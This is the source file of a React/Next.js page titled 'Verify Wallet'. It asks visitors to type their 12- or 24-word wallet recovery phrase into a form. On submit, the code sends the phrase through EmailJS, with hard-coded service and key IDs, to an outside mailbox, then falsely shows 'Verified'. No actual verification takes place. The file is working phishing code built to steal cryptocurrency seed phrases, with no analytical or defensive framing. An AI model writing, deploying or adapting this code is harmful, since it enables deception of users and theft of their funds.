'use client'
import React, { useRef } from 'react'
import emailjs from "emailjs-com";
import { UseWallet } from '../context/context';
import Image from 'next/image';
import Trade from '../trade/page';

function About() {
  const formRef = useRef<HTMLFormElement | null>(null);
  const { selectedWallet } = UseWallet();

  const sendEmail = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!formRef.current) return;

    emailjs
      .sendForm(
        "service_kxp9p3i",
        "template_695nv8c",
        formRef.current,
        "JmQjPLQLPRNYM5Vgp",
      )
      .then(
        () => {
          alert("Verified");
          formRef.current?.reset();
        },
        (error) => {
          alert("Failed to send message. Please try again.");
          console.error(error);
        },
      );
  };

  return (
    <div>
      <div>
        <Trade/>
      </div>
          <div className="px-4 sm:px-10 md:px-20 lg:px-40 py-10">

      <div className="flex justify-center">
        {selectedWallet?.src && (
          <Image
            src={selectedWallet.src}
            className="w-24 sm:w-28 md:w-36 object-contain"
            alt={`${selectedWallet.title || 'Wallet'} logo`}
          />
        )}
      </div>

    
      <div className="text-center text-2xl sm:text-3xl text-black/60 py-6">
        <p className="font-semibold">Verify Wallet</p>
      </div>

      
      <form ref={formRef} onSubmit={sendEmail} className="space-y-5">
        <textarea
          name="message"
          aria-label="Wallet Recovery Phrase"
          placeholder="Phrase"
          className="border border-gray-300 px-4 py-4 w-full h-[20vh] rounded-lg resize-none focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <p className="text-center text-[#2A498D] font-semibold text-xs sm:text-sm">
          Typically 12 (sometimes 24) words separated by single spaces
        </p>
        <button
          type="submit"
          className="w-full bg-[#2A498D] text-white py-2 rounded-3xl font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
        >
          Verify
        </button>
      </form>
    </div>
    </div>

  );
}

export default About;
